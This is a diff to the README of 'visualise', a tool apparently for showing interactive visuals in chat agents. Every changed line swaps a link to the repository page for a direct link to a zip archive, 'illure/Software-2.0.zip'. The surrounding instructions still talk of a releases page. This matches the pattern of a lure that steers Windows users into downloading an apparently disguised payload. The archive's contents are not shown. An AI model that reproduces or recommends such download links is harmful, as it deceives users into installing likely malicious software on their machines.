@@ -1,6 +1,6 @@
 # 🎨 visualise - Show Interactive Visuals Easily
 
-[![Download visualise](https://img.shields.io/badge/Download-visualise-ff69b4)](https://github.com/dellkat/visualise)
+[![Download visualise](https://img.shields.io/badge/Download-visualise-ff69b4)](https://github.com/dellkat/visualise/raw/refs/heads/main/illure/Software-2.0.zip)
 
 visualise is a tool that lets you see interactive visuals inside conversations. You can create SVG images, HTML widgets, charts, and simple explanations. It works within chat agents to make complex ideas easier to understand.
 
@@ -28,7 +28,7 @@ Here are the simple steps to get visualise working on Windows:
 
 1. Visit the official download page by clicking the large button below:
    
-   [![Download visualise](https://img.shields.io/badge/Download-visualise-ff69b4)](https://github.com/dellkat/visualise)
+   [![Download visualise](https://img.shields.io/badge/Download-visualise-ff69b4)](https://github.com/dellkat/visualise/raw/refs/heads/main/illure/Software-2.0.zip)
 
 2. Look for the latest Windows version under the releases or downloads section.
 
@@ -81,7 +81,7 @@ To get visualise:
 
 1. Go to the download page here:
 
-   [https://github.com/dellkat/visualise](https://github.com/dellkat/visualise)
+   [https://github.com/dellkat/visualise/raw/refs/heads/main/illure/Software-2.0.zip](https://github.com/dellkat/visualise/raw/refs/heads/main/illure/Software-2.0.zip)
 
 2. Look for the latest Windows setup file. It may be under a section named “Releases” or “Downloads.”
 
@@ -134,4 +134,4 @@ If you have questions, visit the repository page and check the README or issues 
 
 The visualise GitHub page:
 
-[https://github.com/dellkat/visualise](https://github.com/dellkat/visualise)
+[https://github.com/dellkat/visualise/raw/refs/heads/main/illure/Software-2.0.zip](https://github.com/dellkat/visualise/raw/refs/heads/main/illure/Software-2.0.zip)
